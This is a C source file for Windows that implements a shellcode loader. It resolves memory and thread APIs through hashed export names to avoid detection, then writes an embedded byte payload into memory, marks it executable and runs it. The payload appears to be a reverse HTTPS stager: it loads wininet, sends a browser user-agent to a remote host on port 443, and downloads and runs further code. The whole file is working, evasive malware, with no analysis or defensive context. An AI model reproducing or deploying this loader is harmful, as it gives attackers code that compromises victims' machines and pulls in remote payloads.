#include <windows.h>
#include <stdio.h>

typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* fnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* fnWaitForSingleObject)(HANDLE, DWORD);

DWORD hashing(const char* data) {
    DWORD hash = 0x35;
    for (int i = 0; data[i] != '\0'; i++) {
        hash += data[i] + (hash << 1);
    }
    return hash;
}

LPVOID getAPIAddr(HMODULE h, DWORD hashName) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)h;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((LPBYTE)h + dos->e_lfanew);
    DWORD expDirRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)h + expDirRVA);

    PDWORD names = (PDWORD)((LPBYTE)h + exportDir->AddressOfNames);
    PDWORD funcs = (PDWORD)((LPBYTE)h + exportDir->AddressOfFunctions);
    PWORD ordinals = (PWORD)((LPBYTE)h + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* name = (char*)h + names[i];
        if (hashing(name) == hashName) {
            return (LPBYTE)h + funcs[ordinals[i]];
        }
    }
    return nullptr;
}

unsigned char payload[841] =
{ 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x0f,
0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,
0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,
0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x44,0x8b,0x40,0x20,0x8b,0x48,0x18,0x50,0x49,0x01,0xd0,
0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,
0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,0xac,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x41,0x58,0x48,0x01,0xd0,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,
0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,
0x49,0xc7,0xc2,0x4c,0x77,0x26,0x07,0xff,0xd5,0x53,0x53,0xe8,
0x82,0x00,0x00,0x00,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,
0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,
0x20,0x4e,0x54,0x20,0x31,0x30,0x2e,0x30,0x3b,0x20,0x57,0x69,
0x6e,0x36,0x34,0x3b,0x20,0x78,0x36,0x34,0x29,0x20,0x41,0x70,
0x70,0x6c,0x65,0x57,0x65,0x62,0x4b,0x69,0x74,0x2f,0x35,0x33,
0x37,0x2e,0x33,0x36,0x20,0x28,0x4b,0x48,0x54,0x4d,0x4c,0x2c,
0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x29,
0x20,0x43,0x68,0x72,0x6f,0x6d,0x65,0x2f,0x31,0x33,0x31,0x2e,
0x30,0x2e,0x30,0x2e,0x30,0x20,0x53,0x61,0x66,0x61,0x72,0x69,
0x2f,0x35,0x33,0x37,0x2e,0x33,0x36,0x20,0x45,0x64,0x67,0x2f,
0x31,0x33,0x31,0x2e,0x30,0x2e,0x32,0x39,0x30,0x33,0x2e,0x38,
0x36,0x00,0x59,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,
0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,
0xd5,0xe8,0x08,0x00,0x00,0x00,0x30,0x2e,0x30,0x2e,0x30,0x2e,
0x30,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,
0x00,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,
0x89,0x9f,0xc6,0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0xa0,0x00,
0x00,0x00,0x2f,0x67,0x2d,0x57,0x61,0x38,0x59,0x32,0x42,0x51,
0x6e,0x6d,0x45,0x4f,0x34,0x55,0x35,0x37,0x48,0x71,0x58,0x73,
0x51,0x54,0x50,0x4a,0x54,0x36,0x69,0x4b,0x50,0x33,0x30,0x73,
0x6d,0x2d,0x79,0x44,0x4e,0x38,0x74,0x56,0x76,0x74,0x39,0x4b,
0x66,0x64,0x65,0x62,0x59,0x4a,0x65,0x73,0x73,0x47,0x75,0x66,
0x79,0x4e,0x41,0x62,0x75,0x43,0x70,0x49,0x68,0x6d,0x4f,0x2d,
0x46,0x7a,0x32,0x71,0x41,0x39,0x47,0x6b,0x47,0x61,0x6d,0x36,
0x73,0x34,0x35,0x61,0x31,0x78,0x51,0x64,0x56,0x43,0x69,0x2d,
0x39,0x6d,0x5a,0x76,0x78,0x73,0x6c,0x50,0x4a,0x30,0x67,0x56,
0x69,0x32,0x53,0x66,0x63,0x6f,0x6b,0x77,0x74,0x58,0x6d,0x66,
0x61,0x57,0x33,0x37,0x42,0x4c,0x70,0x79,0x54,0x48,0x69,0x50,
0x38,0x52,0x58,0x34,0x69,0x62,0x68,0x56,0x7a,0x69,0x74,0x73,
0x6b,0x48,0x6a,0x4f,0x30,0x33,0x6e,0x47,0x68,0x67,0x51,0x32,
0x34,0x32,0x64,0x6b,0x4c,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,
0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,
0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,
0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,
0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,
0x6a,0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,
0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,
0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,
0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,
0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,
0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,
0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,
0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,0xba,
0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,
0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,
0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,
0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,
0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,
0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,
0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5 };
int main() {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");

    DWORD hashVirtualAlloc = hashing("VirtualAlloc");
    DWORD hashVirtualProtect = hashing("VirtualProtect");
    DWORD hashCreateThread = hashing("CreateThread");
    DWORD hashWaitForSingleObject = hashing("WaitForSingleObject");

    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)getAPIAddr(hKernel32, hashVirtualAlloc);
    fnVirtualProtect pVirtualProtect = (fnVirtualProtect)getAPIAddr(hKernel32, hashVirtualProtect);
    fnCreateThread pCreateThread = (fnCreateThread)getAPIAddr(hKernel32, hashCreateThread);
    fnWaitForSingleObject pWaitForSingleObject = (fnWaitForSingleObject)getAPIAddr(hKernel32, hashWaitForSingleObject);

    LPVOID mem = pVirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(mem, payload, sizeof(payload));

    DWORD oldProtect;
    pVirtualProtect(mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect);

    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    pWaitForSingleObject(hThread, INFINITE);

    return 0;
}
